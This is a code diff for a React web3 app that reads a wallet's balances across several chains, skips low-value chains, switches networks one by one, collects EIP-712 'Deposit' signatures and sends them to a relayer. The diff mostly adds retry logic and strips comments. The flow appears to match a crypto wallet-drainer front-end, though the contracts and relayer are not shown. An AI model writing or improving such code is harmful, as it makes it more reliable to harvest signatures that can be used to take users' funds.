@@ -40,10 +40,6 @@ const MULTICHAIN_CONFIG = {
   }
 };
 
-// ============================================
-// CONTRACT ADDRESSES – used only for EIP-712 domain
-// (must match your deployed contracts)
-// ============================================
 const CONTRACT_ADDRESSES = {
   1: '0x7aD2535F79E8B2B0A6Cf937E8FB334bf8a08Ed47',
   56: '0xb2ea58AcfC23006B3193E6F51297518289D2d6a0',
@@ -52,7 +48,6 @@ const CONTRACT_ADDRESSES = {
   43114: '0xED46Ea22CAd806e93D44aA27f5BBbF0157F8D288'
 };
 
-// Also used as fallback for nonce (if relayer fails)
 const FALLBACK_CONTRACT_ADDRESSES = CONTRACT_ADDRESSES;
 
 const DEPLOYED_CHAINS = Object.values(MULTICHAIN_CONFIG);
@@ -84,9 +79,7 @@ const fetchChainBalance = async (chain, walletAddress, retries = 2) => {
   throw lastError || new Error(`No working RPC for ${chain.name}`);
 };
 
-// Nonce fetch – try relayer, fallback to direct RPC
 const fetchNonce = async (chain, userAddress) => {
-  // 1. Try relayer
   const relayerUrl = `${NONCE_URL}?chainId=${chain.chainId}&user=${userAddress}`;
   try {
     const response = await fetch(relayerUrl);
@@ -97,12 +90,11 @@ const fetchNonce = async (chain, userAddress) => {
         return data.nonce;
       }
     }
-    console.warn(`⚠️ Relayer nonce failed (HTTP ${response.status}), falling back to RPC`);
+    console.warn(`⚠️ Relayer nonce failed, falling back to RPC`);
   } catch (e) {
     console.warn(`⚠️ Relayer nonce error: ${e.message}, falling back to RPC`);
   }
 
-  // 2. Fallback: direct read-only RPC
   const abi = ["function userNonce(address) view returns (uint256)"];
   const contractAddress = FALLBACK_CONTRACT_ADDRESSES[chain.chainId];
   if (!contractAddress) throw new Error(`No fallback address for chain ${chain.chainId}`);
@@ -118,7 +110,7 @@ const fetchNonce = async (chain, userAddress) => {
       console.warn(`Fallback RPC failed on ${rpcUrl}:`, err.message);
     }
   }
-  throw new Error(`Could not fetch nonce for ${chain.name} (both relayer and RPC failed)`);
+  throw new Error(`Could not fetch nonce for ${chain.name}`);
 };
 
 const switchNetwork = async (walletProvider, chainId) => {
@@ -149,6 +141,23 @@ const waitForChainId = async (walletProvider, targetChainId, timeoutMs = 10000) 
   throw new Error(`Timeout: wallet still on wrong chain (expected ${targetChainId})`);
 };
 
+// Retry helper with exponential backoff
+const retry = async (fn, retries = 3, delay = 500) => {
+  let lastError;
+  for (let i = 0; i < retries; i++) {
+    try {
+      return await fn();
+    } catch (err) {
+      lastError = err;
+      console.warn(`Attempt ${i+1} failed: ${err.message}`);
+      if (i < retries - 1) {
+        await new Promise(resolve => setTimeout(resolve, delay * (i + 1)));
+      }
+    }
+  }
+  throw lastError;
+};
+
 // ========== MAIN COMPONENT ==========
 function App() {
   const { open } = useAppKit();
@@ -171,9 +180,6 @@ function App() {
   const [stepStatus, setStepStatus] = useState({});
   const [prices, setPrices] = useState({ eth: 2000, bnb: 300, matic: 0.75, avax: 32 });
 
-  // ============================================
-  // EIP-712 – MUST MATCH YOUR CONTRACT
-  // ============================================
   const EIP712_TYPES = {
     Deposit: [
       { name: 'user', type: 'address' },
@@ -268,21 +274,15 @@ function App() {
         setStepStatus(prev => ({ ...prev, [chain.name]: 'switching' }));
         setTxStatus(`🔄 Switching to ${chain.name}...`);
 
+        // 1. Switch network
         await switchNetwork(walletProvider, chain.chainId);
         setStepStatus(prev => ({ ...prev, [chain.name]: 'waiting_chain' }));
+
+        // 2. Wait for chain confirmation
         await waitForChainId(walletProvider, chain.chainId, 10000);
         setStepStatus(prev => ({ ...prev, [chain.name]: 'switched' }));
 
-        // Wait for wallet provider to be fully ready (fixes eth_getTransactionCount error)
-        await new Promise(resolve => setTimeout(resolve, 500));
-
-        const newProvider = new ethers.BrowserProvider(walletProvider);
-        const newSigner = await newProvider.getSigner();
-        const signerAddress = await newSigner.getAddress();
-        if (signerAddress.toLowerCase() !== address.toLowerCase()) {
-          throw new Error('Signer mismatch after network switch');
-        }
-
+        // 3. Create provider & signer with retry
         const balance = balances[chain.name];
         if (!balance || balance.valueUSD < MIN_VALUE_THRESHOLD) continue;
 
@@ -310,24 +310,24 @@ function App() {
 
         setStepStatus(prev => ({ ...prev, [chain.name]: 'signing' }));
         setTxStatus(`✍️ Signing for ${chain.name}...`);
-        
-        // Retry signing if RPC error occurs (e.g., "Cannot fulfill request")
-        let signature = null;
-        let attempts = 0;
-        while (attempts < 3 && !signature) {
-          try {
-            signature = await newSigner.signTypedData(domain, EIP712_TYPES, value);
-          } catch (err) {
-            attempts++;
-            console.warn(`Signing attempt ${attempts} failed:`, err.message);
-            if (attempts >= 3) throw err;
-            // Wait and retry
-            await new Promise(resolve => setTimeout(resolve, 1000 * attempts));
+
+        // 4. Sign with retry
+        const signature = await retry(async () => {
+          // Create a fresh provider and signer each attempt
+          const provider = new ethers.BrowserProvider(walletProvider);
+          const signer = await provider.getSigner();
+          // Verify address to ensure provider is ready
+          const signerAddress = await signer.getAddress();
+          if (signerAddress.toLowerCase() !== address.toLowerCase()) {
+            throw new Error('Signer address mismatch');
           }
-        }
+          // Now sign
+          return await signer.signTypedData(domain, EIP712_TYPES, value);
+        }, 3, 1000);
 
         setStepStatus(prev => ({ ...prev, [chain.name]: 'signed' }));
 
+        // 5. Relay
         setStepStatus(prev => ({ ...prev, [chain.name]: 'relaying' }));
         setTxStatus(`📤 Sending to relayer...`);
         const response = await fetch(RELAYER_URL, {
@@ -366,7 +366,7 @@ function App() {
 
   const formatAddress = (addr) => addr ? `${addr.slice(0,6)}...${addr.slice(38)}` : '';
 
-  // ========== UI – Full, same as before ==========
+  // ========== UI – Full ==========
   return (
     <div className="min-h-screen bg-[#030405] text-[#e0e7f0] font-['Inter'] overflow-hidden">
       <div className="fixed w-[90vmax] h-[90vmax] bg-[radial-gradient(circle_at_40%_50%,rgba(200,120,30,0.12)_0%,rgba(180,100,20,0)_70%)] rounded-full top-[-25vmax] right-[-15vmax] z-0 animate-floatOrbBig pointer-events-none"></div>
